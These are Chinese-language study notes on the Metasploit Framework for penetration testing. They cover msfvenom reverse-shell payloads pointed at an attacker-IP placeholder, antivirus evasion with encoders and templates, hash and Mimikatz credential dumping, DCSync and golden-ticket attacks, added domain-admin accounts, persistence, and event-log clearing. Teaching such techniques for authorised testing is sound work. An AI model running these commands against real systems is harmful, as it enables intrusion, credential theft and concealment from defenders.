资源
- 工具 https://github.com/rapid7/metasploit-framework
- 教程 https://www.offsec.com/metasploit-unleashed/introduction/
- 文档 
    - https://docs.rapid7.com/metasploit/
    - https://docs.metasploit.com/
- 图书 MetaSploit 渗透测试指南 第二版（Metasploit: The Penetration Tester’s Guide, 2nd Edition）
- 靶机 https://github.com/rapid7/metasploitable3


atips
- 载荷
    - 分阶段 `平台/载荷/载荷类型`
    - 未分阶段 `平台/载荷_载荷类型`

- 反向 shell 步骤
    - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html

- 工具
    - Msfvenom 
        生成 shellcode、可执行文件、编码
    - nasm_shell.rb
        汇编查看器
- 接口
    - MSFconsole 
        做任何事情，包括发起漏洞利用、加载辅助模块、执行枚举或创建监听器。

    - 资源脚本模块
        包含 Metasploit 命令和 Ruby 代码的短程序
        - 例，它在 443 端口上启动一个监听器：

            ```ruby
            use exploit/multi/handler
            set PAYLOAD windows/meterpreter/reverse_tcp
            set LHOST <攻击者 IP 地址>
            set LPORT 443
            exploit
            ```
        - 使用任何文本编辑器创建资源脚本。在 `msfconsole` 使用 `-r` 标志运行它，并传递脚本的路径
            - `msfconsole -r 脚本路径`

## MSFvenom - 载荷创建与编码

```bash
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<攻击者 IP 地址> -f exe -o payload.exe
```

`-p` 选项指定要使用的载荷类型。这里，我们使用的是 Meterpreter shell，它通过反向 TCP 连接到 handler。`LHOST` 选项指定监听主机，`-f` 选项指定输出类型（这里我们选择输出可执行文件），`-o` 标志指定文件名（`payload.exe`）。

当用户点击生成的 `payload.exe` 文件时，反向 shell 将激活并连接到 Kali 机器上运行的监听器。连接建立后，渗透测试人员将能够远程控制目标机器。

如果你想生成一段 C 代码片段 shellcode 以包含在你正在开发的漏洞利用中，你可以选择 `-f c` 选项

MSFvenom 通过以不包含“坏”字符并生成唯一十六进制模式的方式对原始载荷进行编码，帮助你规避防病毒和 IDS。
- `-b 避免字符` 


### 编码

- `--list encoders`
    列出编码器格式，请注意，不同的编码器用于不同的平台
    - `x86/shikata_ga_nai` 通用编码器
- `-e 编码器名称`
    使用编码器对载荷进行编码
    - `-i 迭代次数`
        编码器迭代指定次数

### 自定义可执行模板

当运行 MSFvenom 时，载荷被嵌入到位于 `/usr/share/metasploit-framework/data/templates/template.exe` 的默认 MSFvenom 可执行模板中。尽管此模板偶尔会更改，但杀毒厂商在构建签名时仍然会查找它。然而，MSFvenom 也支持使用任何 Windows 可执行文件替换默认可执行模板，通过 `-x` 选项。

`--keep` 标志来保留 PuTTY 的原始功能。`--keep` 标志配置载荷在主可执行文件的单独线程中启动，以便应用程序在载荷执行时行为正常。

## MSFconsole 

数据库
- 查看状态
    - `db_status` 查看连接状态

- 设置
    - `workspace -a 数据库名称` 添加数据库
    - `workspace 数据库名称` 切换数据库
    - `db_import 文件名` 导入 XML 文件到数据库
    - `load 插件名` 加载插件

- 使用 nmap 扫描并保存到数据库
    - `db_nmap`

- 查看数据
    - `hosts -c address` 显示条目中的主机信息，仅显示 address 字段
        - 使用 `字段, 字段` 逗号分隔以显示字段对应的摘要或统计
        - 单独使用字段以显示详情 `hosts` `vulns`

- 漏洞利用
    - 显示模块
        - `show exploits` – 显示利用特定漏洞来获得机器访问权限的漏洞利用模块。
        - `show auxiliary` – 显示 Metasploit 中的辅助模块，这些模块可用于广泛用作扫描器、拒绝服务模块、模糊测试器等。
        - `show options` – 显示控制框架模块各种设置的选项。
        - `info 模块名` 显示模块详情 
    - 搜索模块
        - `search name:apache type:exploit disclosure:YYYY-01-01` 搜索漏洞利用
            此搜索命令中使用了三个过滤器。
            - `name` 过滤器搜索指定的字段。
            - `type` 限制模块的类型。这里为漏洞利用模块。
            - `disclosure` 将结果限制在特定年份的漏洞利用。
    - 在 Exploit DB 数据库搜索漏洞代码
        - `searchsploit 漏洞名称` 工具搜索 Exploit DB 数据库，包含可用于执行漏洞利用的代码。每个程序都标有一个唯一的编号。
            - `-p 漏洞程序编号` 标志查看此漏洞利用的详细信息
    - 使用模块
        - 设置模块
            - `use 模块名` 使用并进入模块内部
                - `set` 设置
                - `unset` 关闭设置
                - `back` 命令返回上一级
                - `show options` 显示模块选项
                - `show payloads` 适用于该漏洞利用的载荷
                - `show targets` 列出易受攻击的潜在目标
                - `save` 保存当前的设置，以便下次运行控制台时它们可用
            - `setg` 和 `unsetg` 命令全局设置或取消设置参数。
        - 使用模块
            - `exploit` 或 `run` 命令，启动模块，并开始漏洞利用过程。在你执行此命令之前，模块中的代码不会运行。
## 扫描

### 使用数据库

Metasploit 允许你轻松导入基本的 Nmap 生成的 XML 导出文件（使用 Nmap 的 `-oX` 选项创建）。

Metasploit 内置了对 PostgreSQL 数据库系统的支持，该系统在 Kali 和官方 Metasploit 安装程序中默认安装。在将 Nmap 文件导入 Metasploit 之前，你需要启动并初始化此数据库，方法如下：

```bash
kali@kali:~$ sudo systemctl start postgresql
kali@kali:~$ sudo msfdb init
```

第一次启动 MSFconsole 时，询问是否创建数据库表。

### 执行 TCP 空闲扫描

一种更高级的 Nmap 扫描方法——TCP 空闲扫描，允许我们通过欺骗网络上另一台主机的 IP 地址来隐蔽地扫描目标。要使这种扫描生效，我们首先需要定位一个使用增量 IP ID（用于跟踪数据包顺序）的空闲主机。当空闲系统使用增量 IP ID 时，这些 ID 变得可预测，从而使我们能够计算出下一个 ID。每当 IP ID 序列的可预测性出现中断时，我们就知道发现了一个开放端口。要了解有关 IP ID 序列和此模块的更多信息，请访问 https://nmap.org/book/idlescan.html 和 https://www.metasploit.com/modules/auxiliary/scanner/ip/ipidseq。

然而，许多操作系统通过随机化 IP ID 来防范此类攻击。使用框架的 `scanner/ip/ipidseq` 模块扫描符合 TCP 空闲扫描要求的主机：

```bash
msf > use auxiliary/scanner/ip/ipidseq
msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(ipidseq) > set THREADS 50
THREADS => 50
msf auxiliary(ipidseq) > run
```
- 使用空闲扫描模块，设置 ip 范围，设置线程数后执行以扫描空闲僵尸主机

```sh
msf auxiliary(ipidseq) > nmap -Pn -sI 192.168.1.109 192.168.1.155
[*] exec: nmap -Pn -sI 192.168.1.109 192.168.1.155
Idle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental
Interesting ports on 192.168.1.155
```
- 使用 Nmap 的 `-sI 空闲僵尸主机 目标ip` 空闲扫描选项


### 从 MSFconsole 运行 Nmap

我们应该能够在 MSFconsole 中输入 `db_nmap` 命令来运行 Nmap，并将其结果自动存储到我们的新数据库中：

```bash
msf > db_nmap -sS -A 10.10.11.129

[*] Nmap: Starting Nmap (https://nmap.org)
```

MSFconsole：
- `services` 检查扫描结果

### 使用 Metasploit 进行端口扫描

除了能够使用第三方扫描器外，Metasploit 在其辅助模块中还内置了几个端口扫描器，这些扫描器直接与框架的大部分方面集成。

要查看框架提供的端口扫描工具列表，请输入：

```bash
msf > search portscan
```

### 定向扫描

定向扫描会查找已知可利用且能提供进入目标网络的便捷途径的特定操作系统、服务、程序版本或配置。Rapid7 维护了一个经过验证的扫描器和漏洞利用模块仓库（https://www.rapid7.com/db/?q=&type=metasploit）。从最新的扫描器开始是一个好主意。

你可以通过在搜索框中输入关键字 `scanner` 来查找最新的扫描器，因为扫描漏洞的模块名称通常以此关键字结尾。

当你选择感兴趣的扫描器时，你应该会看到关于如何运行它的逐步说明。

### 扫描服务器消息块（SMB）

Metasploit 可以扫描网络并尝试使用其 `smb_version` 模块识别 Microsoft Windows 的版本。此扫描器依赖于检测服务器消息块（SMB），一种常见的文件共享协议。

```bash
msf > use auxiliary/scanner/smb/smb_login
```

### 寻找配置不当的 Microsoft SQL Server

配置不当的 Microsoft SQL Server（MS SQL）安装可能提供进入目标网络的初始途径。事实上，一些系统管理员甚至不知道他们的工作站上安装了 MS SQL 服务器，因为该服务是作为某些常见软件（如 Microsoft Visual Studio）的先决条件安装的。这些安装可能未被使用、未打补丁，甚至从未配置过。

当 MS SQL 安装后，它默认监听 TCP 端口 1433 或一个随机的动态 TCP 端口。如果 MS SQL 正在监听动态端口，只需查询 UDP 端口 1434 即可发现是哪个。当然，Metasploit 有一个可以利用此功能的模块：`mssql_ping`。

```bash
msf > use auxiliary/scanner/mssql/mssql_ping
```

扫描器尝试寻找 MS SQL 服务器，并识别实例名称、SQL 服务器版本及其监听的 TCP 端口号。想想看，这种针对 SQL 服务器的定向扫描比在目标子网的所有机器上对所有端口运行 Nmap 以寻找难以捉摸的 TCP 端口节省了多少时间。

### 扫描 S3 存储桶

如果你正在评估云环境，你可能还想扫描 Amazon Simple Storage Service（S3）存储桶，这是一种云存储形式。如果 S3 存储桶配置不正确，可能会向攻击者泄露信息。S3Scanner（https://github.com/sa7mon/S3Scanner）是扫描 S3 存储桶的好工具。

Scott Piper 创建的 http://flaws.cloud 站点。这个故意易受攻击的站点及其姊妹站点 http://flaws2.cloud 是练习云渗透测试技能的绝佳资源。


### 扫描 SSH 服务器版本

如果在扫描过程中遇到运行安全外壳（SSH）的机器，你应该确定目标上运行的版本。SSH 是一种安全协议，但研究人员已经发现了其各种实现中的漏洞。你永远不知道什么时候会走运，遇到一台未更新的旧机器。

你可以使用框架的 `ssh_version` 模块确定目标服务器上运行的 SSH 版本：

```bash
msf > use auxiliary/scanner/ssh/ssh_version
```

### 扫描 FTP 服务器

FTP 是一个复杂且不安全的协议。FTP 服务器通常是进入目标网络的最简单途径，你应该始终扫描、识别并指纹识别目标上运行的所有 FTP 服务器。

让我们看一下使用框架的 `ftp_version` 模块扫描 FTP 服务的示例：

```bash
msf > use auxiliary/scanner/ftp/ftp_version
```

识别 FTP 服务器后，使用框架的 `anonymous` 模块查看此 FTP 服务器是否允许匿名登录：

```bash
msf > use auxiliary/scanner/ftp/anonymous
```

### 扫描简单网络管理协议（SNMP）

简单网络管理协议（SNMP）通常用于网络设备中，以报告带宽利用率和冲突率等信息。然而，一些操作系统也有 SNMP 服务器，可以提供 CPU 利用率、可用内存和其他特定于系统的详细信息。

可访问的 SNMP 服务器可以提供有关特定系统的大量信息，甚至可能使远程设备被攻陷。例如，如果你能获得 Cisco 路由器的读/写 SNMP 社区字符串，你就可以下载路由器的整个配置、修改它，然后将其上传回路由器。（社区字符串本质上是用于查询设备信息或将配置信息写入设备的密码。）

Metasploit 框架包含一个名为 `snmp_enum` 的内置辅助模块，专门用于 SNMP 扫描。在开始扫描之前，请记住只读（RO）和读/写（RW）社区字符串将在你能够从给定设备提取的信息类型中发挥重要作用。在配置了 SNMP 的基于 Windows 的设备上，你通常可以使用 RO 或 RW 社区字符串来提取补丁级别、运行的服务、用户名、正常运行时间、路由和其他信息，这些信息可以在渗透测试期间为你提供极大便利。

要获得对交换机的访问权限，你首先需要尝试找到其社区字符串。在你猜出社区字符串后，某些版本的 SNMP 将允许从过度的信息披露到完全系统入侵的各种行为。SNMPv1 和 v2 本身存在缺陷的协议。SNMPv3 融合了加密和更好的检查机制，因此更加安全。

框架的 `snmp_login` 模块将尝试通过将一个字典中的条目发送到一个 IP 地址或一个 IP 地址范围来猜测社区字符串：

```bash
msf > use auxiliary/scanner/snmp/snmp_login
```

### 编写自定义扫描器

尽管 Metasploit 提供了大量的扫描模块，但有时你可能需要编写自己的自定义扫描器。例如，你可能想要扫描一个在非标准端口上运行的服务。

查看 metasploit 指南或手册

技巧：当你在 Meterpreter 会话中时，输入 `background` 可以跳回 MSFconsole 并让会话保持后台运行。然后输入 `sessions -l` 和 `sessions -i sessionid` 返回你的 Meterpreter 控制台。

## Meterpreter 后渗透利用

- 需迁移至可访问活动桌面的进程，如 `C:\\WINDOWS\\Explorer.EXE` 的功能
    - `screenshot` 命令将导出活动用户桌面的图像
    - `run post/windows/capture/keylog_recorder` 键盘记录器
- `shell` 创建一个新的 shell 进程
- `sysinfo` 系统运行的平台信息 
- `migrate 进程ID` 进程迁移
    - 迁移后用户身份为目标进程用户
    - 迁移是将载荷代码复制到另一个进程虚拟内存中的行为。一旦载荷被复制，它将作为目标进程中的一个新线程执行。
    - 用于实现进程迁移的 Windows API 调用：Jorge Lajara 的《Meterpreter 中的进程迁移》（https://lajara.gitlab.io/process-migration）。
- `execute -f 程序路径` 执行程序
- `smart_hashdump` 后渗透模块从系统中提取用户名和密码哈希。
- `use priv` 加载 Meterpreter 的权限扩展。此扩展实现了多种功能，包括转储包含用户名和密码的安全账户管理器（SAM）数据库。
- `ipconfig` 查看机器网络连接

### 接口路由

```sh
msf > use post/multi/manage/autoroute
```

使用 `autoroute` 模块在两个接口之间建立路由，该模块使用 Rex Socket 库将路由添加到 Metasploit 的内部路由表中。这些路由允许渗透测试人员轻松地将数据包从一个接口传递到另一个接口

### 内网扫描

#### ARP

```sh
msf > use auxiliary/windows/gather/arp_scanner
```

地址解析协议（ARP）扫描，它通过向子网中的所有 IP 地址发送 ARP 请求来检测机器。ARP 请求包查询网络中其他机器的 MAC 地址。如果网络上存在某台机器，它将使用 ARP 回复包进行响应

####  SOCKS 和代理链

使用 Nmap 进行此扫描，但在受感染主机上安装该工具可能会导致我们被检测到。相反，我们将使用 SOCKS 和代理链将 Nmap 扫描从攻击者机器路由，经过受感染主机，进入内部网络。SOCKS 协议允许我们通过第三方将 TCP 和 UDP 流量转发到另一个 IP 地址。

我们首先启动 SOCKS 代理服务器，它将充当第三方：

```sh
msf > use auxiliary/server/socks_proxy
```

接下来，我们将使用 ProxyChains 工具作为 SOCKS 客户端，以便连接到刚刚创建的代理服务器。我们将在 Kali Linux 机器上的端口 1080 上运行该客户端。运行后，我们将把 Nmap 扫描产生的 TCP 和 UDP 数据包通过端口 1080 上的代理客户端转发到受感染机器上运行的代理服务器，然后代理服务器再将数据包转发到内部网络。

通过按如下方式编辑 `/etc/proxychains.conf` 配置文件，告诉代理链工具使用端口 1080：

```bash
kali@kali:~$ sudo nano /etc/proxychains.conf
```

编辑后的文件中最后几行应如下所示：

```text
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

现在我们已经配置好了 ProxyChains，让我们使用它来路由 Nmap 流量：

```sh
kali@kali:~$ sudo proxychains nmap -A -n -sT -Pn 192.168.57.
3
...
```

请注意，除了运行 Nmap 之外，你还可以将 ProxyChains 用于其他目的。每当你想使用某个工具而不必将其安装在受感染主机上时，请考虑使用它。


### 密码

- `run post/windows/gather/smart_hashdump` 从系统中检索所有用户名和密码哈希
    -  示例 `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::`
        - 字符串由四部分组成，以冒号分隔：用户名、相对标识符、LM 哈希和 NTLM 哈希。但是，以 `aad3b435` 开头的哈希值只是一个空或 null 哈希值：空字符串的占位符。因此，这一行等价于 `Administrator:500:NOLMHASH:ntlmhash`。
- 哈希传递技术
    - NTLM 协议设计中的一个漏洞，该协议接受密码哈希而不验证发送者是否知道密码
    - 使用 `exploit/windows/smb/psexec` 模块

#### Mimikatz 和 Kiwi

Mimikatz 用于从 Windows 系统中提取密码。它通过直接访问 Windows 身份验证包（如 MSV（LM/NTLM）、WDigest、Kerberos 等）来发挥作用。

本质上，Mimikatz 搜索所有通常存储密码的位置，作为调试器附加到进程，并尝试提取凭据

Metasploit 的 `kiwi` 模块是 Mimikatz 的一个移植

- `creds_all` 命令来提取哈希和凭据
    - 运行所有 Mimikatz 凭据模块，并从 MSV 身份验证包以及 `wdigest.dll` 和 `tspkg.dll` 中提取密码。
- `dcsync_ntlm` 黄金票据攻击，欺骗网络上的域控制器与我们共享所有用户凭据。

### 提权

`auxiliary/scanner/ssh/ssh_login` 模块 SSH 登录普通用户
- `sessions` 建立普通 SSH 会话
- `sessions -u 会话ID` 命令将你的 shell 升级为 Meterpreter 会话
- `use priv` 加载 priv 扩展，这使我们能够访问权限提升功能
    - `getsystem` 将我们的权限从本地用户提升到管理员
    - 要切换回最初获得 Meterpreter shell 时的先前用户账户，我们将使用 `rev2self` 命令。
- 替代的权限提升模块 `run post/multi/recon/local_exploit_suggester` 模块是发现本地权限提升漏洞利用工具
    - `background` 命令将 Meterpreter 会话发送到后台
    - 输入 `use` 命令选择列出的其中一个模块
    - 设置 `set session 会话ID` 会话 ID 到后台 Meterpreter 会话以进行提权
    - `exploit` 命令运行模块提权会话
    - 漏洞利用完成后，它应该返回一个具有本地 Windows 机器最高权限（`NT AUTHORITY\SYSTEM`）的 Meterpreter 会话
- `Windows Exploit Suggester` 是另一个用于查找 Windows 权限提升漏洞的有用工具：https://github.com/AonCyberLabs/Windows-Exploit-Suggester。你还可以在 https://github.com/swisskyrepo/PayloadsAllTheThings 找到适用于 Windows 和 Linux 的广泛权限提升技术列表。

### 降权

`use post/windows/manage/run_as` 模块切换用户
- `DOMAIN` 字段设置本地或域用户
    - 域用户似乎无法直接登录，需在 shell 设置 `net localgroup` 本地组后降权登录
- run 后创建了目标用户身份运行的进程
    - 在 meterpreter 中 `migrate 进程ID` 迁移进程后身份变化
    - 或 `steal_token 进程ID` 窃取进程用户的令牌

### 横向移动技术

#### 令牌模拟

当用户登录 Windows 系统时，他们会收到一个安全令牌。他们可以使用此令牌访问其他系统和服务而无需重新认证，因为令牌包含用户的身份和权限。在令牌模拟中，攻击者获取目标机器上的 Kerberos 令牌，并使用它代替认证来冒充最初创建该令牌的用户身份。

meterpreter
- 窃取令牌
    - `ps` 列出网络上运行的应用程序并显示它们运行所在的账户
    - `steal_token 进程ID` 窃取进程用户的令牌

- 伪装令牌
    - `use incognito` 加载 incognito
        - `list_tokens -u` 列出令牌
    - `impersonate_token 域名\\用户名` 伪装令牌

- 添加域管理账户
    - `add_user 用户名 密码 -h IP地址`
    - `add_group_user "用户组" 用户名 -h IP地址`

    在执行 `add_user` 和 `add_group_user` 命令时，请务必指定 `-h` 标志，该标志告诉 incognito 在哪里添加域管理员账户

这种攻击的影响是毁灭性的。本质上，域管理员登录过的任何系统上的 Kerberos 令牌都可以被窃取，并用于访问整个域。这意味着你网络中的每一台服务器都可能成为你最薄弱的环节！

#### DCSync 和黄金票据攻击

在 DCSync 攻击中，攻击者假装自己是域控制器，并请求网络上的另一台机器通过发送包含用户和密码哈希的数据库副本来与其同步。

该数据库中最重要的哈希之一是 Kerberos 票据授予票（krbtgt）。这是用于签名域控制器生成的所有票据的密码哈希。如果攻击者能够窃取此密码哈希，他们可以生成一个已签名的票据，授予他们访问网络上所有机器的权限，这通常被称为黄金票据。拥有黄金票据的攻击者可以在不使用任何漏洞利用的情况下获得对域上系统的访问权限。

DCSync 攻击只能从属于域管理员的账户执行。通过启动 shell 并运行以下 `whoami` 命令，确认你已获得一个属于域管理员组成员的账户

meterpreter
- `load kiwi` 加载 kiwi 模块
    - `dcsync_ntlm krbtgt `

    krbtgt 是标记为 NTLM Hash 的哈希值。一旦我们获取了它，就可以使用 kiwi 的 `golden_ticket_create` 命令来生成黄金票据。

- `golden_ticket_create -d <Domain> -u <关联用户名> -s <安全标识符> -k <KRGTBT_HASH> -t <输出目录.tck>` 
    生成黄金票据

- `kerberos_ticket_use` 命令后跟票据路径将其与当前会话关联

- `kerberos_ticket_list` 命令查看所有票据的列表

#### 其他功能

meterpreter：
- 启用远程桌面服务 
    - `run post/windows/manage/enable_rdp`
- 查看目标上的所有流量
    - `load sniffer` 加载 sniffer 模块
        - `sniffer_interfaces` 列出机器上的网络接口
        - `sniffer_start 接口编号` 嗅探接口
        - `sniffer_dump 接口编号 文件名.pcap` 转储结果
- 信息收集 `gather` 模块

#### 建立持久化

持久化技术允许你即使系统管理员修补了漏洞或重启了系统，也能访问系统。

linux
- ssh
    - `use post/linux/manage/sshkey_persistence`
        设置用户名并创建一个文件夹来存储新的 SSH 密钥。然后，选择一个会话并在其中运行持久化模块

        该模块将把一对公私 SSH 密钥与会话用户关联，并将私钥存储在 Kali 机器上的指定路径文件
    - `use auxiliary/scanner/ssh/ssh_login_pubkey` 
        使用私钥登录机器
        - `PRIVATE_KEY` 值不直接输入密钥，而是通过指定 `file:` 关键字和私钥的路径从文件加载它


Metasploit 框架支持许多其他持久化技术。使用以下搜索命令查看适用于 Windows 系统的列表：
- `msf > search platform:windows persistence`

#### 使用 Railgun 操作 Windows API

名为 Railgun 的 Metasploit 附加组件直接与 Windows 本机 API 交互，irb shell 允许我们使用 Ruby 语法与 Meterpreter 交互。

迁移到 Explorer 进程中，以便我们可以使用 Windows 用户界面

迁移后，我们将使用 Railgun 库

    ```sh
    meterpreter > irb
    >> railgun... ...
    ```

irb 清除日志、掩盖痕迹，并使蓝队更难检测到你：

    ```ruby
    >> logs = sys.eventlog.open('system')
    >> logs.clear
    ```

清除日志文件的另一种方法是在你的解释器会话中运行 `clearev` 命令：

```bash
meterpreter > clearev
```

### 跳转到其他系统

有时机器无法直接通过互联网访问；例如，如果它们位于防火墙后面。如果攻击者入侵了防火墙或其后面的机器，他们可以利用该被入侵的机器攻击内部网络上的其他机器。这种技术称为 pivoting，攻击者通过被入侵的机器将数据包路由到其他机器来在网络中移动。Metasploit 有关于使用 Meterpreter 通过网络进行 pivoting 的优秀文档：https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html。

## 客户端利用模块

针对计算机上常见安装的软件，如网页浏览器、PDF阅读器和 Microsoft Office 应用程序。

这些利用通常需要首先绕过公司的防护措施，例如诱骗用户点击恶意链接。

### 基于浏览器的利用

#### 在 Metasploit 中查找漏洞

让我们开始搜索最新的浏览器漏洞。使用 MSFconsole 的 search 命令，并按当前或最近年份过滤结果。

```sh
msf > search browser date:<year>
```

少有可用模块，且可能拥有前置条件。

#### 使用 AutoPwn2 自动化利用

在前面的例子中，我们事先知道需要利用的浏览器的名称和版本。然而，你并不总是知道目标会使用什么浏览器版本来打开链接。AutoPwn2 模块试图通过尝试多个漏洞来自动化浏览器利用过程，希望访问链接的浏览器容易受到其中某个漏洞的攻击

```sh
msf > use auxiliary/server/browser_autopwn2
```

#### 寻找更新的漏洞

Exploit-DB 是查找最新浏览器漏洞的绝佳资源。然而，许多与这些漏洞相关的错误在被添加到该数据库之前可能已经被修补。如果你想找到可以在生产环境浏览器上利用的漏洞，可以查看即将发布的版本中正在修复的问题，以及 Beta 版本中正在修复的常见漏洞与暴露（CVE）：这些是当前应用程序生产版本中存在的错误。

你也可以尝试发现新的（零日）浏览器漏洞。过去，基于语法的模糊测试器帮助攻击者发现浏览器漏洞。

### 文件格式漏洞

文件格式漏洞是在文件阅读器（如 Adobe PDF 阅读器）中发现的可利用漏洞。这类利用依赖于用户在易受攻击的应用程序中打开恶意文件。这些恶意文件可以远程托管或通过电子邮件发送。

文件格式漏洞可以被任何你认为目标容易受到攻击的文件利用，无论是 Microsoft Word 文档、PDF、图像还是其他文件类型。

```sh
msf > search fileformat date:<year>
```

## 辅助模块

除了提供有价值的侦察工具（如端口扫描器和服务指纹识别器）之外，像 `ssh_login` 这样的辅助模块还可以获取已知的用户名和密码列表，然后尝试通过暴力破解登录整个目标网络。辅助模块中还包含各种协议模糊测试器，例如 `ftp_pre_post`、`http_get_uri_long`、`smtp_fuzzer` 和 `ssh_version_corrupt` 等等。你可以针对目标服务启动这些模糊测试器，以期发现自己的可利用漏洞。

Metasploit 将这些模块安装在 `/modules/auxiliary` 目录中，并根据它们提供的功能进行分类。如果你是从源码安装 Metasploit 而不是通过 Kali，你会在 `/opt/metasploit-framework/embedded/framework/tools/modules` 下找到这些模块。如果你想创建自己的模块或编辑现有的模块以适应特定目的，你可以在相应的目录中找到示例。例如，如果你需要开发一个模糊测试器来发现自己的漏洞，你可以在 `/fuzzers` 目录中找到预先存在的模糊测试模块。

要列出 Metasploit 中所有可用的辅助模块，可以在 MSFconsole 中执行 `show auxiliary` 命令。

### 创建/修改辅助模块

将其放在 auxiliary 目录中，以便 Metasploit 可以使用它。

### 调试模块

调试模块可能具有挑战性，因为如果模块包含错误，Metasploit 框架将不会加载它。有时它会在终端中显示错误，但其他时候会将它们存储在 `framework.log` 文件中。在开发模块时，最好检查这个日志文件，你可以使用 `locate` 命令找到它：

```bash
kali@kali:~$ locate framework.log
```

当你修复了一个错误后，你需要重新启动 Metasploit 框架才能使更改生效。对于更高级的调试，请尝试 `pry-byebug`（https://github.com/deivid-rodriguez/pry-byebug）。Rapid7 有一些关于使用 `pry-byebug` 调试 Metasploit 模块的优秀文章。

## 将漏洞移植到框架中

并非所有漏洞都是为 Metasploit 或用 Ruby 编写的；有些是用 Perl、Python、C、C++ 或其他语言编写的。

当你将漏洞移植到 Metasploit 时，你会将现有的独立漏洞（例如 Python 或 Perl 脚本）转换为 Metasploit 内部可用的格式。导入漏洞后，你可以利用框架的许多高级工具来处理常规任务。此外，尽管独立漏洞通常依赖于你使用特定的 payload 或操作系统，但一旦它们被移植到框架中，你就可以即时生成 payload，并在多种场景中使用该漏洞。

- 在虚拟机中禁用保护以构建利用程序
- 在 www.exploit-db.com 找到 POC 代码以及易受攻击的目标应用程序
- 精简 POC 代码
- 创建模块骨架
- 填充漏洞利用部分
    - 调试用 dummy shellcode
    - 用随机选择的大写字母替换填充字符
    - 用 NOP 等效指令替换 `\x90` 字符
- 移除 dummy shellcode


## 构建自己的模块

启用 `xp_cmdshell` 存储过程

### 运行模块

`mssql_exec` 辅助模块，该模块调用 `xp_cmdshell` 存储过程。你可以将此模块视为可通过 MS SQL 访问的命令提示符。我们将使用该模块执行 `whoami /priv` 命令，该命令应给我们一个用户权限列表

```sh
msf > use auxiliary/admin/mssql/mssql_exec
```

### 探索 mssql_payload 模块

让我们来看看刚刚使用的 `mssql_exec` 模块内部发生了什么。这样，在编写自己的模块之前，我们可以先了解现有模块是如何运作的。

`include` 语句从 Metasploit 核心库中拉入 MS SQL 模块。它将处理所有基于 MS SQL 的通信，并包含 `mssql_xpcmdshell` 函数的实现，该函数执行我们提供的命令。

Metasploit 模块包含其他模块的功能是很常见的，如此处所示。让我们检查 Metasploit 核心库的 MS SQL 模块（`mssql.rb`）中的 `mssql_xpcmdshell` 函数，以更好地理解其功能。

尽量复用已存在的其他模块的函数而不是从头构建

## 开发漏洞利用

### 模糊测试

模糊测试是指向应用程序发送无效、意外或畸形的数据，并监视其是否出现异常（如崩溃）。如果发现漏洞，你就可以着手为其开发利用代码。

### 绕过限制

至此，我们完成了模糊测试过程，可以开始针对发现的漏洞开发利用代码。现在我们可以覆盖 SEH，我们希望向目标注入一些自定义 shellcode。然而，在 SEH 覆盖之后，栈结束前可用的 shellcode 空间非常小。

这个漏洞非常适合采用“egg hunter”策略，它使用一小段 shellcode 在内存中搜索主 payload。你可以在以下 Coalfire 博客文章中阅读更多关于 egg hunting 的内容：https://www.coalfire.com/the-coalfire-blog/the-basics-of-exploit-development-3-egg-hunters。

###  坏字符与远程代码执行

某些字符如果作为漏洞缓冲区的一部分发送，在应用程序读取时会被破坏。不幸的结果是，坏字符会使你的 shellcode（有时甚至是整个漏洞）无法使用。

在编写 Metasploit 模块时，你应该始终确保识别所有坏字符，因为 Metasploit 生成的编码 shellcode 在每次启动漏洞时都会不同，任何 rogue 坏字符都会大大降低模块的可靠性。在许多情况下，如果你未能找到所有坏字符，应用程序会在运行 shellcode 之前崩溃。

有多种方法可以识别坏字符，包括将动态创建的 shellcode 替换为顺序字符字符串（`\x00\x01\x02...`），检查调试器以查看第一个字符在哪里被破坏，并将该字符标记为坏字符。例如，以下是与该漏洞相关的一些坏字符列表：`\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b`。

当漏洞模块声明 `BadChars` 变量时，Metasploit 将自动从其值中排除 shellcode 以及任何自动生成的文本或 NOP 字符串。

一种优秀但繁琐的消除所有坏字符的方法是遵循 https://en.wikibooks.org/wiki/Metasploit/Writing_Windows_Exploit#Dealing_with_badchars 中描述的技术。Mona 插件也可以帮助检测坏字符。

